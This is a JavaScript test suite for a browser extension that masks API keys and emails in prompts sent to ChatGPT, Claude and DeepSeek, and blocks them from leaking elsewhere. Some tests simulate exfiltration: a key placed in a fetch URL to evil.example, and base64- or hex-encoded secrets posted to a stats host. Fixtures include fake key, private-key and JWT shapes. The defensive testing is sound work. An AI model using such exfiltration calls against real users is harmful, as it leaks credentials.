import assert from "node:assert/strict";
import { test } from "node:test";
import { installNetGuard } from "../src/main-world/guard-core.ts";
import { hasNote, stripNote } from "../src/shared/placeholders.ts";
import { AWS, DeadBridge, DirectBridge, KEY, MAIL, bodyText, makeWindow, realBrain, recordFetch, tick } from "./helpers.mjs";

const CONV = "https://chatgpt.com/backend-api/f/conversation";
const json = (o) => JSON.stringify(o);
const chatgpt = (text) => json({ action: "next", messages: [{ id: "m1", author: { role: "user" }, content: { content_type: "text", parts: [text] } }], model: "gpt-5" });
const blocked = (e) => e instanceof Error && /^Zuko blocked/.test(e.message);

async function rig({ bridge, brain, url = "https://chatgpt.com/", site = "chatgpt" } = {}) {
  brain ??= await realBrain();
  bridge ??= new DirectBridge(brain, { site });
  const win = makeWindow({ url });
  const calls = recordFetch(win);
  const xhrSent = [];
  win.XMLHttpRequest.prototype.send = function (body) {
    xhrSent.push({ xhr: this, body });
  };
  const sockets = [];
  win.WebSocket = class {
    constructor(u) {
      this.url = u;
      this.readyState = 1;
      this.sent = [];
      sockets.push(this);
    }
    send(d) {
      this.sent.push(d);
    }
  };
  const beacons = [];
  win.Navigator.prototype.sendBeacon = function (url, data) {
    beacons.push({ url, data });
    return true;
  };
  const clip = { text: null, writes: 0 };
  win.Clipboard = class {
    async writeText(t) {
      clip.text = t;
      clip.writes++;
    }
    async write() {
      clip.writes++;
    }
  };
  const guard = installNetGuard(win, site, bridge);
  return { win, brain, bridge, calls, xhrSent, sockets, beacons, clip, guard };
}

test("fetch: the ChatGPT prompt is masked and everything else about the call is untouched", async () => {
  const { win, calls } = await rig();
  const headers = { "content-type": "application/json", "oai-device-id": "d-1" };
  const init = { method: "POST", headers, body: chatgpt(`my key is ${KEY} and mail ${MAIL}`), credentials: "include" };
  await win.fetch(CONV, init);
  assert.equal(calls.length, 1);
  const sent = calls[0].init;
  assert.equal(calls[0].input, CONV);
  assert.equal(sent.headers, headers);
  assert.equal(sent.method, "POST");
  assert.equal(sent.credentials, "include");
  assert.ok(!sent.body.includes(KEY) && !sent.body.includes(MAIL));
  const part = JSON.parse(sent.body).messages[0].content.parts[0];
  assert.ok(hasNote(part));
  assert.equal(stripNote(part), "my key is {{API_KEY_1}} and mail {{EMAIL_1}}");
});

test("fetch with a Request object (claude.ai completion) is rebuilt with the masked body", async () => {
  const { win, calls } = await rig({ site: "claude", url: "https://claude.ai/chats" });
  const url = "https://claude.ai/api/organizations/1f2e3d/chat_conversations/9a8b7c/completion";
  const req = new Request(url, { method: "POST", headers: { "content-type": "application/json" }, body: json({ prompt: `key ${AWS}`, attachments: [], files: [] }) });
  await win.fetch(req);
  const sent = calls[0].input;
  assert.ok(sent instanceof Request);
  assert.equal(sent.headers.get("content-type"), "application/json");
  const text = await sent.text();
  assert.ok(!text.includes(AWS));
  assert.equal(stripNote(JSON.parse(text).prompt), "key {{API_KEY_1}}");
});

test("a prompt with nothing sensitive goes out exactly as the page built it", async () => {
  const { win, calls } = await rig();
  const init = { method: "POST", body: chatgpt("How do I sort a dict by value?") };
  await win.fetch(CONV, init);
  assert.equal(calls[0].init, init, "same init object, same body");
});

test("tripwire: a vault value in ANY other request body is replaced", async () => {
  const { win, calls, brain } = await rig();
  await brain.maskMany([KEY], { site: "chatgpt", mode: "full" }); // the user masked it earlier
  const telemetry = json({ event: "composer_text", props: { text: `pasted ${KEY} here` }, id: "e9a1" });
  await win.fetch("https://chatgpt.com/ces/v1/t", { method: "POST", body: telemetry });
  const out = calls[0].init.body;
  assert.ok(!out.includes(KEY));
  assert.deepEqual(JSON.parse(out), { event: "composer_text", props: { text: "pasted {{API_KEY_1}} here" }, id: "e9a1" });
});

test("tripwire also covers third-party hosts, with the value JSON-escaped inside the body", async () => {
  const { win, calls, brain } = await rig();
  await brain.applyDetector({ customTerms: ['Q3 "Falcon" plan'] });
  await brain.maskMany(['the Q3 "Falcon" plan'], { site: "chatgpt", mode: "full" });
  await win.fetch("https://stats.example.net/collect", { method: "POST", body: json({ note: 'see the Q3 "Falcon" plan now' }) });
  assert.deepEqual(JSON.parse(calls[0].init.body), { note: "see the {{TERM_1}} now" });
});

test("no vault and no prompt endpoint: requests are not even inspected", async () => {
  const { win, calls, bridge } = await rig();
  const init = { method: "POST", body: json({ a: 1 }) };
  await win.fetch("https://chatgpt.com/ces/v1/t", init);
  assert.equal(calls[0].init, init);
  assert.equal(bridge.requests.length, 0, "no round trip to the engine");
});

test("a protected value in a cross-origin URL blocks the request", async () => {
  const { win, calls, brain, bridge } = await rig();
  await brain.maskMany([KEY], { site: "chatgpt", mode: "full" });
  await assert.rejects(win.fetch(`https://evil.example/c?k=${encodeURIComponent(KEY)}`), blocked);
  await assert.rejects(win.fetch(`https://evil.example/c?k=${KEY}`), blocked);
  assert.equal(calls.length, 0);
  assert.ok(bridge.posts.some((p) => p.type === "notify" && p.level === "error" && /blocked a request to evil\.example/.test(p.text)));
  // Same-origin GETs are left alone.
  await win.fetch("https://chatgpt.com/backend-api/me?x=1");
  assert.equal(calls.length, 1);
});

test("encoded copies of a vault value cannot be fixed in place: base64, hex and URL-encoded bodies are blocked", async () => {
  const { win, calls, brain } = await rig();
  const value = "sk-live-Zq8x_Fake-Value-12345";
  const spaced = "pass word/Zq8x+Fake=Value 12345"; // needs escaping, so its URL-encoded form differs from the raw one
  await brain.applyDetector({ customTerms: [value, spaced] });
  await brain.maskMany([value, spaced], { site: "chatgpt", mode: "full" });
  const bodies = [
    json({ blob: Buffer.from(`prefix:${value}`).toString("base64") }),
    json({ blob: Buffer.from(value).toString("hex") }),
    `q=${encodeURIComponent(spaced)}&x=1`,
  ];
  for (const body of bodies) await assert.rejects(win.fetch("https://chatgpt.com/ces/v1/t", { method: "POST", body }), blocked, body);
  assert.equal(calls.length, 0);
});

test("form-urlencoded bodies are checked per field and rebuilt", async () => {
  const { win, calls, brain } = await rig();
  await brain.maskMany([MAIL], { site: "chatgpt", mode: "full" });
  const params = new URLSearchParams({ email: MAIL, plan: "free" });
  await win.fetch("https://chatgpt.com/ces/v1/t", { method: "POST", body: params, headers: { "content-type": "application/x-www-form-urlencoded" } });
  const sent = calls[0].init.body;
  assert.ok(sent instanceof URLSearchParams);
  assert.equal(sent.get("email"), "{{EMAIL_1}}");
  assert.equal(sent.get("plan"), "free");
});

test("FormData upload: a text file with a secret is masked in place, other parts survive", async () => {
  const { win, calls } = await rig({ site: "claude", url: "https://claude.ai/new" });
  const fd = new FormData();
  fd.append("kind", "document");
  fd.append("file", new File([`aws ${AWS}\nmail ${MAIL}\n`], "creds.txt", { type: "text/plain" }));
  fd.append("image", new File([new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0, 255, 1])], "x.png", { type: "image/png" }));
  await win.fetch("https://claude.ai/api/organizations/1f2e3d/upload", { method: "POST", body: fd });
  const sent = calls[0].init.body;
  assert.ok(sent instanceof FormData);
  assert.equal(sent.get("kind"), "document");
  const file = sent.get("file");
  assert.equal(file.name, "creds.txt");
  assert.equal(file.type, "text/plain");
  assert.equal(await file.text(), "aws {{API_KEY_1}}\nmail {{EMAIL_1}}\n");
  const png = sent.get("image");
  assert.deepEqual([...new Uint8Array(await png.arrayBuffer())], [0x89, 0x50, 0x4e, 0x47, 0, 255, 1], "binary parts are never rewritten");
});

test("Blob PUT to blob storage: text is masked with full detection, binary passes untouched", async () => {
  const { win, calls } = await rig();
  const text = new File([`token ${KEY}`], "env.txt", { type: "text/plain" });
  await win.fetch("https://files.oaiusercontent.com/file-abc?se=1&sig=2", { method: "PUT", body: text });
  const sent = calls[0].init.body;
  assert.equal(await sent.text(), "token {{API_KEY_1}}");
  assert.equal(sent.name, "env.txt");
  const bin = new Blob([new Uint8Array([0xff, 0xfe, 0x00, 0x80])], { type: "application/octet-stream" });
  await win.fetch("https://files.oaiusercontent.com/file-def?se=1", { method: "PUT", body: bin });
  assert.equal(calls[1].init.body, bin);
});

test("an untyped blob that is not valid UTF-8 is never rewritten through a lossy decode", async () => {
  const { win, calls, brain } = await rig();
  await brain.maskMany([KEY], { site: "chatgpt", mode: "full" });
  const bytes = new Uint8Array([0xc3, 0x28, 0xa0, 0xa1, ...new TextEncoder().encode(KEY)]);
  const blob = new Blob([bytes]);
  await win.fetch("https://chatgpt.com/ces/v1/t", { method: "POST", body: blob });
  assert.equal(calls[0].init.body, blob);
});

test("switched off for the site: nothing is touched, nothing is asked", async () => {
  const brain = await realBrain();
  const bridge = new DirectBridge(brain, { enabled: false });
  const { win, calls } = await rig({ brain, bridge });
  const init = { method: "POST", body: chatgpt(`key ${KEY}`) };
  await win.fetch(CONV, init);
  assert.equal(calls[0].init, init);
  assert.equal(bridge.requests.length, 0);
});

// ---- fail-safe ---------------------------------------------------------------------------

test("engine unavailable + a high-confidence secret: the prompt request is BLOCKED and the user is told", async () => {
  const bridge = new DeadBridge();
  const { win, calls } = await rig({ bridge });
  await assert.rejects(win.fetch(CONV, { method: "POST", body: chatgpt(`please use ${KEY} for the call`) }), (e) => blocked(e) && /not available/.test(e.message));
  assert.equal(calls.length, 0, "nothing reached the network");
  const note = bridge.posts.find((p) => p.type === "notify");
  assert.equal(note.level, "error");
  assert.match(note.text, /Nothing was sent/);
  assert.ok(!JSON.stringify(bridge.posts).includes(KEY), "the secret is never echoed into the notice");
});

test("engine unavailable, every site: Anthropic, AWS, GitHub, private key and JWT shapes are blocked; normal text passes", async () => {
  const secrets = [
    "sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz0123456789_-AbCdEfGhIj",
    AWS,
    "ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8",
    "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk=\n-----END OPENSSH PRIVATE KEY-----",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
  ];
  for (const [site, url, make] of [
    ["chatgpt", CONV, (s) => chatgpt(s)],
    ["claude", "https://claude.ai/api/organizations/o1/chat_conversations/c1/completion", (s) => json({ prompt: s, attachments: [] })],
    ["deepseek", "https://chat.deepseek.com/api/v0/chat/completion", (s) => json({ prompt: s, chat_session_id: "s" })],
  ]) {
    const host = new URL(url).origin + "/";
    const r = await rig({ bridge: new DeadBridge(), site, url: host });
    for (const s of secrets) await assert.rejects(r.win.fetch(url, { method: "POST", body: make(`here: ${s}`) }), blocked, `${site}: ${s.slice(0, 12)}`);
    assert.equal(r.calls.length, 0);
    const ok = { method: "POST", body: make("How do I center a div? HTTP_2 and SHA_256 are fine.") };
    await r.win.fetch(url, ok);
    assert.equal(r.calls[0].init, ok, `${site}: ordinary prompts still go through`);
  }
});

test("engine unavailable: non-prompt requests and ids that merely look random pass untouched", async () => {
  const { win, calls } = await rig({ bridge: new DeadBridge() });
  const init = { method: "POST", body: json({ id: "aaa2f3c4-71d0-4b7e-9c0e-5d3f4a8b1c22", token: "gAAAAABl" + "x".repeat(64) }) };
  await win.fetch("https://chatgpt.com/ces/v1/t", init);
  assert.equal(calls[0].init, init);
});

test("a bug inside the guard never breaks the page: unexpected errors send the request unchanged", async () => {
  const brain = await realBrain();
  const bridge = new DirectBridge(brain);
  bridge.request = async () => {
    throw new RangeError("boom");
  };
  const { win, calls } = await rig({ brain, bridge });
  await brain.maskMany([KEY], { site: "chatgpt", mode: "full" });
  const init = { method: "POST", body: json({ x: "plain" }) };
  const warn = console.warn;
  console.warn = () => {};
  try {
    await win.fetch("https://chatgpt.com/ces/v1/t", init);
  } finally {
    console.warn = warn;
  }
  assert.equal(calls.length, 1);
});

// ---- XHR / WebSocket / beacon / clipboard -------------------------------------------------

test("XHR: send is deferred until the body is masked; abort cancels; errors surface as events", async () => {
  const { win, xhrSent, brain } = await rig();
  const xhr = new win.XMLHttpRequest();
  xhr.open("POST", CONV);
  xhr.setRequestHeader("content-type", "application/json");
  xhr.send(chatgpt(`key ${KEY}`));
  assert.equal(xhrSent.length, 0, "not sent synchronously");
  await tick(30);
  assert.equal(xhrSent.length, 1);
  assert.ok(!xhrSent[0].body.includes(KEY));
  assert.equal(stripNote(JSON.parse(xhrSent[0].body).messages[0].content.parts[0]), "key {{API_KEY_1}}");

  // Abort before the guard answered: nothing is ever sent, the page sees 'abort'.
  const x2 = new win.XMLHttpRequest();
  x2.open("POST", CONV);
  const events = [];
  x2.addEventListener("abort", () => events.push("abort"));
  x2.send(chatgpt(`again ${KEY}`));
  x2.abort();
  await tick(30);
  assert.equal(xhrSent.length, 1);
  assert.deepEqual(events, ["abort"]);

  // Blocked: the page gets error + loadend, nothing is sent.
  await brain.applyDetector({ customTerms: ["Zq8x-Fake-Value-12345"] });
  await brain.maskMany(["Zq8x-Fake-Value-12345"], { site: "chatgpt", mode: "full" });
  const x3 = new win.XMLHttpRequest();
  x3.open("POST", "https://stats.example.net/c");
  const seen = [];
  x3.onerror = () => seen.push("error");
  x3.onloadend = () => seen.push("loadend");
  x3.send(Buffer.from("Zq8x-Fake-Value-12345").toString("base64"));
  await tick(30);
  assert.deepEqual(seen, ["error", "loadend"]);
  assert.equal(xhrSent.length, 1);
});

test("XHR requests that need no guarding are sent synchronously", async () => {
  const { win, xhrSent } = await rig();
  const xhr = new win.XMLHttpRequest();
  xhr.open("GET", "https://chatgpt.com/backend-api/me");
  xhr.send();
  assert.equal(xhrSent.length, 1);
});

test("WebSocket.send keeps its order while messages wait for the guard", async () => {
  const { win, sockets, brain } = await rig();
  await brain.maskMany([KEY], { site: "chatgpt", mode: "full" });
  const ws = new win.WebSocket("wss://ws.chatgpt.com/ws");
  ws.send("first");
  ws.send(`second ${KEY}`);
  ws.send("third");
  await tick(40);
  assert.deepEqual(ws.sent, ["first", "second {{API_KEY_1}}", "third"]);
  void sockets;
});

test("sendBeacon: returns true at once, delivers the masked payload", async () => {
  const { win, beacons, brain } = await rig();
  await brain.maskMany([MAIL], { site: "chatgpt", mode: "full" });
  assert.equal(win.navigator.sendBeacon("https://chatgpt.com/ces/v1/b", json({ who: MAIL })), true);
  assert.equal(beacons.length, 0);
  await tick(30);
  assert.deepEqual(JSON.parse(beacons[0].data), { who: "{{EMAIL_1}}" });
});

test("copy buttons: the page's writeText is routed to the content script, with the page's own copy as fallback", async () => {
  const brain = await realBrain();
  const asked = [];
  const bridge = new DirectBridge(brain);
  bridge.request = async (msg) => {
    asked.push(msg);
    return { ok: true, written: /\{\{API_KEY_1\}\}/.test(msg.items["text/plain"]) };
  };
  const { win, clip } = await rig({ brain, bridge });
  await win.Clipboard.prototype.writeText.call(new win.Clipboard(), "OPENAI_API_KEY={{API_KEY_1}}");
  assert.equal(clip.writes, 0, "restored and written by the isolated world instead");
  assert.equal(asked.length, 1);
  await win.Clipboard.prototype.writeText.call(new win.Clipboard(), "no placeholders 42");
  assert.equal(clip.text, "no placeholders 42", "falls back to the page's own copy");
  await win.Clipboard.prototype.writeText.call(new win.Clipboard(), "no digits");
  assert.equal(asked.length, 2, "text without digits never reaches the bridge");
});

test("uninstall restores every patched function", async () => {
  const { win, guard } = await rig();
  const patched = win.fetch;
  guard.uninstall();
  assert.notEqual(win.fetch, patched);
  assert.equal(typeof win.fetch, "function");
});
